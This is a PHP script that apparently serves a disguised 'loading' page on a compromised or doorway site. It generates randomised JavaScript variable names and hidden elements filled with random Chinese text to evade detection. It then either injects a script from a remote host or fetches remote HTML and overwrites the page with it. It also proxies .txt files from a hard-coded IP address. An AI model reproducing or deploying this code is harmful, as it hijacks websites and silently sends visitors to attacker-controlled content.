<?php
$current = $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];

function getrandstr(){
  $str='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890';
  $str1='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
  $randStr1 = str_shuffle($str1);//打乱字符串
  $randStr = str_shuffle($str);
  $rand1= substr($randStr1,0,6);//substr(string,start,length);返回字符串的一部分
  $rand= substr($randStr,0,20);
  $rands = $rand1.$rand;
return $rands;
}

//php随机生成汉字 $num为生成汉字的数量
function getChar($num){
    $b = '';
    for ($i=0; $i<$num; $i++) {
    // 使用chr()函数拼接双字节汉字，前一个chr()为高位字节，后一个为低位字节
    $a = chr(mt_rand(0xB0,0xD0)).chr(mt_rand(0xA1, 0xF0));
    // 转码
    $b .= iconv('GB2312', 'UTF-8', $a);
  }
    return $b;
}

function check_id($id,$cars){
        if (!in_array($id, $cars)){
          return $id;
        }
        else{
          $id = getrandstr();
          if(!in_array($id,$cars)){
                return $id;
          }
          else{
                  exit("failed create!\n");
          }
        }
}

function mkdirs_1($path, $mode = 0777){
  if(is_dir($path)){
        echo "无法创建$path,已经是目录了 \n";
    return '无法创建,已经是目录了';
  }else{
    if(mkdir($path, $mode, true)) {
      return '创建成功';
    }else{
          echo "创建失败$path \n";
      return '创建失败';
    }
  }
}

function get_label_end($laba){
         if (strstr($laba,"<div")){
                 return '</div>';
         }elseif (strstr($laba,'<ul')){
                 return '</ul>';
         }elseif (strstr($laba,'<img')){
                 return '';
         }elseif (strstr($laba,'<span')){
                 return '</span>';
         }elseif (strstr($laba,'<li')){
                 return '</li>';
         }elseif (strstr($laba,'<a')){
                 return '</a>';
         }elseif (strstr($laba,'<b')){
                 return '</b>';
         }elseif (strstr($laba,'<p')){
                 return '</p>';
         }elseif (strstr($laba,'<h1')){
                 return '</h1>';
         }else {
                 return 'DDDDDDDDDDDD';
         }
 }

function get_label(){
        $aa = array("<div style='display:none'>","<div style='display:none'>","<ul style='display:none' >","<img  src='' style='display:none'>","<a  href='#' style='display:none'>","<span style='display:none'>","<li style='display:none' >","<b style='display:none' >","<p  style='display:none'>","<h1 style='display:none' >");

        $count_arr = count($aa)-1;
        $indexn = mt_rand(0,$count_arr);
        $bb_head = $aa[$indexn];
        $charc = '';
        if (strstr($bb_head,"<a")){
                $charc = getrandstr().getrandstr().getrandstr();
        }elseif(strstr($bb_head,"<img")){
                $charc = '';
        }else{
                $charc = getChar(mt_rand(20,100));
        }

        $ee_end = get_label_end($bb_head);
        $cc_chain = $bb_head.$charc.$ee_end;

        return $cc_chain;
}


function get_final_label(){
        $t = mt_rand(3,10);
        $final_label = '';
        for ($y=2; $y<=$t;$y++){
                $final_label = $final_label.get_label()."\n";
        }
        return $final_label;
}

$eeee = get_final_label();
for ($x=1; $x<=1; $x++) {
  $arr = array();
  $identfier1 = check_id(getrandstr(),$arr);
  array_push($arr,$identfier1);
  $identfier2 = check_id(getrandstr(),$arr);
  array_push($arr,$identfier2);
  $identfier3 = check_id(getrandstr(),$arr);
  array_push($arr,$identfier3);
  $identfier4 = check_id(getrandstr(),$arr);
  array_push($arr,$identfier4);
  $identfier5 = check_id(getrandstr(),$arr);
  array_push($arr,$identfier5);
  $identfier6 = check_id(getrandstr(),$arr);
  array_push($arr,$identfier6);
  $identfier7 = check_id(getrandstr(),$arr);
  array_push($arr,$identfier7);
  $identfier8 = check_id(getrandstr(),$arr);
  foreach($arr as $key=>$value)

$fontsize = rand(50, 65);
$top = rand(35, 160);



$HTML = <<<heredoc
<!DOCTYPE html>
<html>
<head><meta charset="utf-8">

</head>
<body>
<h1 style="font-size: ${fontsize}px;text-align:center; margin: ${top}px 0 0 0;"> 努力加载中...<h1>
$eeee
</body>
<script>
document.title="请稍后，连接中...";
if(!document.referrer){
        var $identfier1 = $identfier7('type');var $identfier2 = $identfier7('to');
        $identfier8("https://work.he.cn/api/go_land.php?type="+$identfier1+"&to="+$identfier2)
    }else{
        var $identfier3 = $identfier7('fw'); var isescaped = $identfier3.includes('.escaped');
        var $identfier4 = new XMLHttpRequest; var html = null; $identfier4.onload = function(){html = $identfier4.responseText;$identfier6();}; var url = "https://work.he.cn/"; $identfier4.open("GET", url + $identfier3, !0); $identfier4.send();
    }
function $identfier7($identfier5) { var reg = new RegExp("(.|&)" + $identfier5 + "=([^&#]*)(&|$|#)"); var r = window.location.href.match(reg); if (r != null) return unescape(r[2]); return '';}
function $identfier6() {var a = document.open("text/html", "replace"); if(isescaped){html = unescape(html)} a.write(html); a.close();}
function $identfier8(a) { var c = document.createElement("script"); c.src = a, document.body.appendChild(c);}
</script>

</html>
heredoc;




if ($current){

    $suffixs = explode("/",$current);
    $suffix = empty(end($suffixs)) ? '' : end($suffixs);

    if ($suffix && substr_count($suffix,'.txt') > 0){
        $domain = "http://47.106.213.120/";
        $code = file_get_contents($domain . "/" . $suffix);
        echo $code;
    }else{
        echo $HTML;
    }
}else{
    echo $HTML;
}


